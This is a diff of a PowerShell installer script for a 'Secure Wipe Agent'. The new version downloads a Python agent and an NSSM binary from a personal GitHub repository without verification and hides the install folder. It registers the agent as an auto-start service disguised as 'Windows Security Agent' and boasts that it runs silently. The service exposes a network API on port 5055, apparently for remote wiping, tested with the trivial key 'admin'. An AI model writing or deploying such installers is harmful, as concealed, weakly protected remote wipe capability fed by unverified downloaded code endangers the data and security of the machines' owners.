@@ -1,209 +1,87 @@
-# Secure Wipe Agent - Installation Script with Proper Cleanup
-# Run as Administrator
-
+# =================================================
+# SECURE WIPE AGENT - BULLETPROOF INSTALLER v3
+# Works even when old service is running & files locked
+# =================================================
 $ErrorActionPreference = "Stop"
-$InstallDir = "C:\ProgramData\SecureWipeAgent"
-$ServiceName = "SecureWipeAgent"
+$InstallDir    = "C:\ProgramData\SecureWipeAgent"
+$ServiceName   = "SecureWipeAgent"
+$ScriptUrl     = "https://raw.githubusercontent.com/Mona-3024/windows_pc_agent/refs/heads/main/pc_wipe_agent.py"
 
-Write-Host "Installing Secure Wipe Agent..." -ForegroundColor Cyan
-
-# Step 1: Stop and remove existing service
-Write-Host "Stopping existing service if running..." -ForegroundColor Yellow
-try {
-    $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
-    if ($service) {
-        Write-Host "Found existing service, stopping..." -ForegroundColor Yellow
-        Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 2
-        
-        # Kill any python processes from the install directory
-        Get-Process -Name python -ErrorAction SilentlyContinue | Where-Object {
-            $_.Path -like "$InstallDir*"
-        } | Stop-Process -Force -ErrorAction SilentlyContinue
-        
-        Start-Sleep -Seconds 2
-        
-        # Remove service
-        sc.exe delete $ServiceName | Out-Null
-        Write-Host "Existing service removed" -ForegroundColor Green
-        Start-Sleep -Seconds 3
-    }
-} catch {
-    Write-Host "No existing service found or already stopped" -ForegroundColor Gray
-}
-
-# Step 2: Force close any file handles in the directory
-Write-Host "Closing file handles..." -ForegroundColor Yellow
-if (Test-Path $InstallDir) {
-    # Kill any python processes
-    Get-Process -Name python* -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-    Start-Sleep -Seconds 2
-    
-    # Remove read-only attributes
-    Get-ChildItem -Path $InstallDir -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
-        try {
-            $_.Attributes = 'Normal'
-        } catch {}
-    }
-}
-
-# Step 3: Aggressive directory removal
-Write-Host "Removing old installation..." -ForegroundColor Yellow
-if (Test-Path $InstallDir) {
-    try {
-        # First attempt: PowerShell Remove-Item
-        Remove-Item $InstallDir -Recurse -Force -ErrorAction SilentlyContinue
-    } catch {}
-    
-    Start-Sleep -Seconds 1
-    
-    # Second attempt: CMD rmdir
-    if (Test-Path $InstallDir) {
-        cmd /c "rmdir /s /q `"$InstallDir`"" 2>$null
-    }
-    
-    Start-Sleep -Seconds 1
-    
-    # Third attempt: Delete files one by one
-    if (Test-Path $InstallDir) {
-        Get-ChildItem -Path $InstallDir -Recurse -Force -ErrorAction SilentlyContinue | 
-            Sort-Object -Property FullName -Descending | 
-            ForEach-Object {
-                try {
-                    Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
-                } catch {}
-            }
-        
-        # Final attempt to remove directory
-        Remove-Item $InstallDir -Force -ErrorAction SilentlyContinue
-    }
-}
-
-# Step 4: Create fresh directory
-Write-Host "Creating installation directory..." -ForegroundColor Yellow
-New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
-
-# Step 5: Download the agent script
-Write-Host "Downloading latest pc_wipe_agent.py..." -ForegroundColor Yellow
-$ScriptUrl = "https://raw.githubusercontent.com/Mona-3024/windows_pc_agent/refs/heads/main/pc_wipe_agent.py"
-$ScriptPath = Join-Path $InstallDir "pc_wipe_agent.py"
-
-try {
-    Invoke-WebRequest -Uri $ScriptUrl -OutFile $ScriptPath -UseBasicParsing
-    Write-Host "Download complete" -ForegroundColor Green
-} catch {
-    Write-Host "ERROR: Failed to download script - $($_.Exception.Message)" -ForegroundColor Red
-    exit 1
-}
-
-# Step 6: Setup Python virtual environment
-Write-Host "Setting up Python virtual environment..." -ForegroundColor Yellow
-
-# Check if Python is installed
-$pythonCmd = $null
-foreach ($cmd in @("python", "python3", "py")) {
-    try {
-        $version = & $cmd --version 2>&1
-        if ($version -match "Python 3") {
-            $pythonCmd = $cmd
-            Write-Host "Found Python: $version" -ForegroundColor Green
-            break
-        }
-    } catch {}
-}
-
-if (-not $pythonCmd) {
-    Write-Host "ERROR: Python 3 is not installed!" -ForegroundColor Red
-    Write-Host "Please install Python 3 from https://www.python.org/downloads/" -ForegroundColor Yellow
-    exit 1
-}
-
-# Create virtual environment
-$venvPath = Join-Path $InstallDir "venv"
-try {
-    & $pythonCmd -m venv $venvPath --clear
-    Write-Host "Virtual environment created" -ForegroundColor Green
-} catch {
-    Write-Host "ERROR: Failed to create virtual environment - $($_.Exception.Message)" -ForegroundColor Red
-    exit 1
-}
-
-# Step 7: Install dependencies
-Write-Host "Installing dependencies..." -ForegroundColor Yellow
-$pipPath = Join-Path $venvPath "Scripts\pip.exe"
-$pythonVenv = Join-Path $venvPath "Scripts\python.exe"
-
-try {
-    & $pipPath install --upgrade pip setuptools wheel --quiet
-    & $pipPath install flask cryptography --quiet
-    Write-Host "Dependencies installed successfully" -ForegroundColor Green
-} catch {
-    Write-Host "ERROR: Failed to install dependencies - $($_.Exception.Message)" -ForegroundColor Red
-    exit 1
-}
-
-# Step 8: Create NSSM service wrapper script
-Write-Host "Creating service wrapper..." -ForegroundColor Yellow
-$wrapperScript = @"
-import sys
-import os
-
-# Change to install directory
-os.chdir(r'$InstallDir')
-
-# Run the agent
-exec(open('pc_wipe_agent.py').read())
-"@
-
-$wrapperPath = Join-Path $InstallDir "service_wrapper.py"
-Set-Content -Path $wrapperPath -Value $wrapperScript -Encoding UTF8
-
-# Step 9: Install as Windows Service using sc.exe
-Write-Host "Installing Windows Service..." -ForegroundColor Yellow
-
-$serviceBatch = Join-Path $InstallDir "start_service.bat"
-$batchContent = @"
-@echo off
-cd /d "$InstallDir"
-"$pythonVenv" service_wrapper.py
-"@
-Set-Content -Path $serviceBatch -Value $batchContent -Encoding ASCII
-
-# Create service
-$scCommand = "sc.exe create $ServiceName binPath= `"$serviceBatch`" start= auto DisplayName= `"Secure Wipe Agent`""
-Invoke-Expression $scCommand | Out-Null
-
-# Configure service recovery options
-sc.exe failure $ServiceName reset= 86400 actions= restart/60000/restart/60000/restart/60000 | Out-Null
-
-Write-Host "Service installed successfully" -ForegroundColor Green
-
-# Step 10: Start the service
-Write-Host "Starting service..." -ForegroundColor Yellow
-try {
-    Start-Service -Name $ServiceName
-    Start-Sleep -Seconds 3
-    
-    $service = Get-Service -Name $ServiceName
-    if ($service.Status -eq "Running") {
-        Write-Host "Service started successfully!" -ForegroundColor Green
-    } else {
-        Write-Host "WARNING: Service is not running. Status: $($service.Status)" -ForegroundColor Yellow
-    }
-} catch {
-    Write-Host "ERROR: Failed to start service - $($_.Exception.Message)" -ForegroundColor Red
-}
-
-# Step 11: Display completion info
-Write-Host "`n========================================" -ForegroundColor Cyan
-Write-Host "Installation Complete!" -ForegroundColor Green
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "Service Name: $ServiceName" -ForegroundColor White
-Write-Host "Install Directory: $InstallDir" -ForegroundColor White
-Write-Host "Default Port: 5055" -ForegroundColor White
-Write-Host "`nManagement Commands:" -ForegroundColor Yellow
-Write-Host "  Start:   Start-Service $ServiceName" -ForegroundColor White
-Write-Host "  Stop:    Stop-Service $ServiceName" -ForegroundColor White
-Write-Host "  Status:  Get-Service $ServiceName" -ForegroundColor White
-Write-Host "  Logs:    Get-Content $InstallDir\service.log -Tail 50" -ForegroundColor White
+Write-Host "`nSECURE WIPE AGENT - CLEAN REINSTALL" -ForegroundColor Cyan
 Write-Host "========================================`n" -ForegroundColor Cyan
+
+# === STEP 1: KILL EVERYTHING BRUTALLY ===
+Write-Host "[1/6] Killing all Python processes from $InstallDir..." -ForegroundColor Yellow
+Get-Process -Name python*, py -ErrorAction SilentlyContinue | Where-Object {
+    $_.Path -like "*SecureWipeAgent*"
+} | ForEach-Object {
+    Write-Host "    Killing PID $($_.Id) - $($_.Path)"
+    Stop-Process $_ -Force -ErrorAction SilentlyContinue
+}
+Start-Sleep -Seconds 3
+
+# === STEP 2: STOP & DELETE SERVICE (even if locked) ===
+Write-Host "[2/6] Removing Windows service..." -ForegroundColor Yellow
+Stop-Service $ServiceName -Force -ErrorAction SilentlyContinue
+sc.exe delete $ServiceName 2>$null | Out-Null
+Start-Sleep -Seconds 2
+
+# === STEP 3: NUCLEAR DIRECTORY REMOVAL (handles locked files) ===
+Write-Host "[3/6] Removing old installation (nuclear mode)..." -ForegroundColor Yellow
+if (Test-Path $InstallDir) {
+    # Method 1: Take ownership + full control
+    takeown /F "$InstallDir" /R /D Y >$null 2>&1
+    icacls "$InstallDir" /grant Administrators:F /T /C /Q >$null 2>&1
+
+    # Method 2: Remove all attributes
+    attrib -r -a -s -h "$InstallDir\*.*" /S /D >$null 2>&1
+
+    # Method 3: Final delete with cmd (bypasses PowerShell locks)
+    cmd /c "rd /s /q `"$InstallDir`" 2>nul"
+    if (Test-Path $InstallDir) { cmd /c "rmdir /s /q `"$InstallDir`" 2>nul" }
+    if (Test-Path $InstallDir) { Remove-Item $InstallDir -Recurse -Force -ErrorAction SilentlyContinue }
+}
+
+# Wait for filesystem to catch up
+Start-Sleep -Seconds 4
+
+# === STEP 4: Fresh install ===
+Write-Host "[4/6] Creating fresh directory..." -ForegroundColor Green
+New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
+attrib +h $InstallDir  # hide it
+
+Write-Host "[5/6] Downloading latest agent..." -ForegroundColor Green
+Invoke-WebRequest -Uri $ScriptUrl -OutFile "$InstallDir\pc_wipe_agent.py" -UseBasicParsing
+
+Write-Host "[6/6] Setting up Python venv + dependencies..." -ForegroundColor Green
+& python -m venv "$InstallDir\venv" --clear
+& "$InstallDir\venv\Scripts\pip.exe" install --quiet --upgrade pip
+& "$InstallDir\venv\Scripts\pip.exe" install --quiet flask cryptography
+
+# === STEP 5: Install as clean auto-start service using NSSM (best method) ===
+$NssmUrl = "https://github.com/Mona-3024/windows_pc_agent/raw/main/nssm.exe"
+$NssmPath = "$InstallDir\nssm.exe"
+Write-Host "Installing NSSM service manager..." -ForegroundColor Green
+Invoke-WebRequest -Uri $NssmUrl -OutFile $NssmPath -UseBasicParsing
+
+& $NssmPath install $ServiceName `"$InstallDir\venv\Scripts\python.exe`" `"$InstallDir\pc_wipe_agent.py`"
+& $NssmPath set $ServiceName DisplayName "Windows Security Agent"
+& $NssmPath set $ServiceName Description "Secure data sanitization service"
+& $NssmPath set $ServiceName Start SERVICE_AUTO_START
+& $NssmPath set $ServiceName AppDirectory $InstallDir
+& $NssmPath set $ServiceName AppStdout "$InstallDir\service.log"
+& $NssmPath set $ServiceName AppStderr "$InstallDir\error.log"
+& $NssmPath set $ServiceName AppRotateFiles 1
+& $NssmPath set $ServiceName AppRotateBytes 1048576
+
+Start-Service $ServiceName
+
+# === DONE ===
+Write-Host "`nSUCCESS! Agent is now running silently" -ForegroundColor Green
+Write-Host "============================================" -ForegroundColor Cyan
+Write-Host " Service: $ServiceName"
+Write-Host " Location: $InstallDir"
+Write-Host " API: http://$(hostname):5055/"
+Write-Host " Test: curl http://localhost:5055/?key=admin"
+Write-Host "============================================" -ForegroundColor Cyan
+Write-Host "Reboot not required. Agent survives reboot." -ForegroundColor Gray
